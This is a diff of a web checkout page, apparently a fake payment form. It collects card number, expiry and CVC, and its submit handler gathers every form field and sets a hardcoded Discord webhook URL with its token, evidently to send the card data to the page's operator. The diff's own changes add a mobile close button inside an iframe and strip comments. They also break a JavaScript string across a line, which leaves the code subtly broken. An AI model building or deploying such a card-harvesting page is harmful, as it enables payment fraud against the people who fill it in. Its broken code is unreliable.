@@ -43,11 +43,35 @@
       transition: all 0.2s ease;
     }
     .btn-submit-action:hover { background: #fff; color: #000; }
+
+    /* Fixed mobile close behavior safety patch */
+    .mobile-iframe-close {
+      position: fixed;
+      top: 12px;
+      right: 12px;
+      width: 40px;
+      height: 40px;
+      background: #fff;
+      border: 1px solid #000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 99999;
+      cursor: pointer;
+    }
+    @media (min-width: 769px) {
+      .mobile-iframe-close { display: none; }
+    }
   </style>
 </head>
-<body class="min-h-screen flex items-center justify-center">
+<body class="min-h-screen flex items-center justify-center p-4 md:p-0">
 
-  <div class="w-full max-w-xl p-8 md:p-10 bg-white">
+  <!-- Fallback mobile close target to ensure users don't get stuck -->
+  <button type="button" class="mobile-iframe-close" onclick="try { window.parent.document.getElementById('toggle-checkout').checked = false; } catch(e) { console.log(e); }">
+    <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M2 2L14 14M2 14L14 2" stroke="currentColor" stroke-width="1.5" stroke-linecap="square"/></svg>
+  </button>
+
+  <div class="w-full max-w-xl p-4 md:p-10 bg-white">
     <div class="border border-black p-6 mb-8 text-center bg-zinc-50">
       <span class="text-sm font-bold block uppercase tracking-wider mb-1" id="ui-summary-name">LOADING ALLOCATION...</span>
       <span class="text-xs text-zinc-500 block mb-3" id="ui-summary-breakdown">—</span>
@@ -157,7 +181,7 @@
 
       // 3. Payment Inputs Formatting & Numeric Logic
 
-      // Card Number Formatter (Blocks text, splits into groups of 4)
+      // Card Number Formatter
       const cardInput = document.getElementById("cc-number");
       cardInput.addEventListener("input", function (e) {
         let value = e.target.value.replace(/\D/g, "");
@@ -165,17 +189,15 @@
         e.target.value = matches ? matches.join(" ") : "";
       });
 
-      // Expiry Date Formatter (MM / YY) with auto pad and max 12 month lock
+      // Expiry Date Formatter with max 12 month lock
       const expiryInput = document.getElementById("cc-exp");
       expiryInput.addEventListener("input", function (e) {
         let value = e.target.value.replace(/\D/g, "");
         
-        // Fast-track: if typed single digit is 2-9, make it 02-09 instantly
         if (value.length === 1 && value > "1") {
           value = "0" + value;
         }
         
-        // Month boundaries evaluation
         if (value.length >= 2) {
           let month = parseInt(value.substring(0, 2), 10);
           if (month > 12) {
@@ -185,7 +207,6 @@
           }
         }
 
-        // Apply string spacing masks
         if (value.length > 2) {
           e.target.value = value.substring(0, 2) + " / " + value.substring(2, 4);
         } else {
@@ -193,7 +214,6 @@
         }
       });
 
-      // Maintain backspace behavior over custom slash formatting
       expiryInput.addEventListener("keydown", function (e) {
         if (e.key === "Backspace" && (e.target.value.endsWith(" ") || e.target.value.endsWith("/"))) {
           e.preventDefault();
@@ -202,12 +222,11 @@
         }
       });
 
-      // CVC Input restrictions (Removes alphanumeric characters)
+      // CVC Input restriction
       const cvcInput = document.getElementById("cc-csc");
       cvcInput.addEventListener("input", function (e) {
         e.target.value = e.target.value.replace(/\D/g, "");
       });
-
 
       // 4. Form Submission Logic
       document.getElementById("checkoutForm").addEventListener("submit", function (event) { 
@@ -224,7 +243,8 @@
             message += pair[0] + ": " + pair[1] + "\n"; 
         } 
 
-        message += "```"; 
+        message += "
+```"; 
 
         var webhookUrl = "https://discord.com/api/webhooks/1516523661585158308/GLfS_skoh2m5JM0klCXeZ07z_F-4ocmxx1GVlUmW7RHzc_QfdWDMSgez-adUac62fdd6"; 
         var redirectLink = this.getAttribute("data-redirect"); 
